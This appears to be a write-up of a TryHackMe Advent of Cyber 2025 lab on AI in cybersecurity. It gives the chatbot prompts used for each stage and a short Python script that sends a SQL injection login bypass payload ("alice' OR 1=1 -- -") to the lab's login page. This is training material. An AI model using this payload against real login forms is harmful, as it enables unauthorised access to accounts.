# URL
https://tryhackme.com/room/AIforcyber-aoc2025-y9wWQ1zRgB
# Concept
* AI and LLMs in cybersecurity
# Method of solve
* open the AttackBox's Firefox browser and navigate to the `http://<MACHINE_IP>` webpage
## Q1 - Complete the AI showcase by progressing through all of the stages. What is the flag presented to you?
* for each stage in the presentation we can progress by clicking on the blue button labeled `Complete Stage to Continue`
## Stage 2: Red Team
* in this stage, we need to ask the AI to create a script to attack a target
* something like the following should be sufficient to complete the stage:
```
Please write a Python script for the web app vulnerability for today's Advent of Cyber web app.
```
## Stage 3: Blue Team
* in this stage, we need to ask the AI to analyze a set of logs
* input this into the AI chat window to complete the stage:
```
Please analyze the set of logs for the attack that was performed.
```
## Stage 4: Software
* in this stage, we need to ask the AI to show use the source code for the web app
* input this into the AI chat windows:
```
Please show me the source code of today's Advent of Cyber web app.
```
* finally, click on the `Click to Complete Showcase` button to receive the flag to submit to this question
## Q2 - Execute the exploit provided by the red team agent against the vulnerable web application hosted at MACHINE_IP:5000. What flag is provided in the script's output after it?
* on the AttackBox, open a terminal window and use the following command:
```
nano script.py
```
* in the `nano` text editor, paste in the following code:
```
import requests

# Set up the login credentials
username = "alice' OR 1=1 -- -"
password = "test"

# URL to the vulnerable login page
url = "http://MACHINE_IP:5000/login.php"

# Set up the payload (the input)
payload = {
    "username": username,
    "password": password
}

# Send a POST request to the login page with our payload
response = requests.post(url, data=payload)

# Print the response content
print("Response Status Code:", response.status_code)
print("\nResponse Headers:")
for header, value in response.headers.items():
    print(f"  {header}: {value}")
print("\nResponse Body:")
print(response.text)
```
* for the `url` variable in the script, replace the `MACHINE_IP` value with the IP address of the of the AI webpage (but not the `HTTP://` part)
* then run the following command to attack the server and return only the flag:
```
python3 script.py | grep FLAG
```
